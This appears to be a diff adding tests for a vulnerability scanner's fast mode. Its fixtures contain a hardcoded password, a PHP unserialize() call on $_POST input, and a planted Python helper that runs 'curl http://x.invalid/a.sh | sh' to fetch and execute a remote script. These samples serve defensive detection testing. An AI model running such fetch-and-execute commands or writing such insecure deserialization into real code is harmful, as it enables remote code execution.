@@ -293,3 +293,36 @@ class TestScannerContextSuppression:
 
         result = VulnScanner().scan(str(repo))
         assert result.suppressed_count >= 1
+
+
+class TestFastMode:
+    """--fast skips content analyzers on test/vendor paths but never changes production findings."""
+
+    def _repo(self, tmp_path):
+        repo = tmp_path / "proj"
+        (repo / "tests").mkdir(parents=True)
+        (repo / "tests" / "AuthTest.java").write_text('String password = "supersecret123";', encoding="utf-8")
+        (repo / "app.php").write_text('<?php $d = unserialize($_POST["d"]);', encoding="utf-8")
+        return repo
+
+    def test_default_still_counts_suppressed(self, tmp_path):
+        from vulnscanner.scanner import VulnScanner
+        assert VulnScanner().scan(str(self._repo(tmp_path))).suppressed_count >= 1
+
+    def test_fast_skips_test_files_and_keeps_production_findings(self, tmp_path):
+        from vulnscanner.scanner import VulnScanner
+        repo = self._repo(tmp_path)
+        slow = VulnScanner().scan(str(repo))
+        fast = VulnScanner(fast=True).scan(str(repo))
+        assert fast.suppressed_count == 0
+        assert {(f.file_path, f.rule_id) for f in fast.findings} == {(f.file_path, f.rule_id) for f in slow.findings}
+
+    def test_fast_still_reports_malware_in_test_paths(self, tmp_path):
+        from vulnscanner.scanner import VulnScanner
+        repo = tmp_path / "proj"
+        (repo / "tests").mkdir(parents=True)
+        (repo / "tests" / "helper.py").write_text(
+            "import os\nos.system('curl http://x.invalid/a.sh | sh')\n", encoding="utf-8")
+        slow = VulnScanner().scan(str(repo))
+        fast = VulnScanner(fast=True).scan(str(repo))
+        assert {f.rule_id for f in fast.findings} == {f.rule_id for f in slow.findings}
